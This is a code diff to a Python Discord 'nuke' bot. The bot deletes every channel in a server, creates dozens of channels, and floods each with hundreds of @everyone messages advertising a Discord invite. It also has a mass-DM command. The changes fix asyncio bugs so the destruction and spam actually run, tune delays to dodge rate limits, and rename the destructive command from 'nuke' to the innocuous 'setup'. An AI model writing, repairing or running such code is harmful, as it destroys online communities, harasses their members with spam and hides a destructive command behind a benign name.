@@ -3,11 +3,11 @@ from discord.ext import commands
 import os
 import asyncio
 
-Configuration = {}
+# Configuration
 prefix = "!"
-channel_name = "nuked-by-jhub"
-spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
-channels_to_create = 30
+channel_name = "nuked by jhub"
+spam_message = "@everyone NUKED BY JHUB discord.gg/k7dfvnK7KK"
+channels_to_create = 40
 pings_per_channel = 500
 
 intents = discord.Intents.all()
@@ -15,7 +15,7 @@ bot = commands.Bot(command_prefix=prefix, intents=intents)
 
 @bot.event
 async def on_ready():
-    print(f"âœ… {bot.user} is online and ready.")
+    print(f"✅ {bot.user} is online and ready.")
 
 async def spam_channel(channel):
     for i in range(pings_per_channel):
@@ -23,16 +23,16 @@ async def spam_channel(channel):
             await channel.send(spam_message)
             if (i + 1) % 10 == 0:
                 print(f"Sent {i + 1} messages in {channel.name}")
-            await asyncio.sleep(0.2)  # small delay to reduce rate limit chances
+            await asyncio.sleep(0.3)  # small delay to reduce rate limit chances
         except Exception as e:
             print(f"Failed to send message in {channel.name}: {e}")
             break
 
 @bot.command()
-async def nuke(ctx):
+async def setup(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    print("âš ï¸ Starting NUKE sequence...")
+    print("⚠️ Starting NUKE sequence...")
 
     # Delete all channels
     channels = list(guild.channels)
@@ -47,8 +47,8 @@ async def nuke(ctx):
             except Exception as e:
                 print(f"Failed to delete channel {channel.name}: {e}")
 
-    await asyncio.gather((safe_delete(c) for c in channels))
-    await asyncio.sleep(0.3)
+    await asyncio.gather(*(safe_delete(c) for c in channels))
+    await asyncio.sleep(2)
 
     # Create channels
     print(f"Creating {channels_to_create} channels...")
@@ -65,9 +65,11 @@ async def nuke(ctx):
     # Spam all channels concurrently
     print("Starting to spam all channels...")
     spam_tasks = [asyncio.create_task(spam_channel(ch)) for ch in created_channels]
-    await asyncio.gather(spam_tasks)
+    await asyncio.gather(*spam_tasks)
 
-    print("NUKE complete.")
+    print("✅ NUKE complete.")
+
+
 
 import asyncio
 
@@ -94,6 +96,7 @@ async def massdm(ctx, message: str):
         print("MASS DM complete.")
 
     await main(members)  # <-- call main
+
 
 
 if __name__ == "__main__":
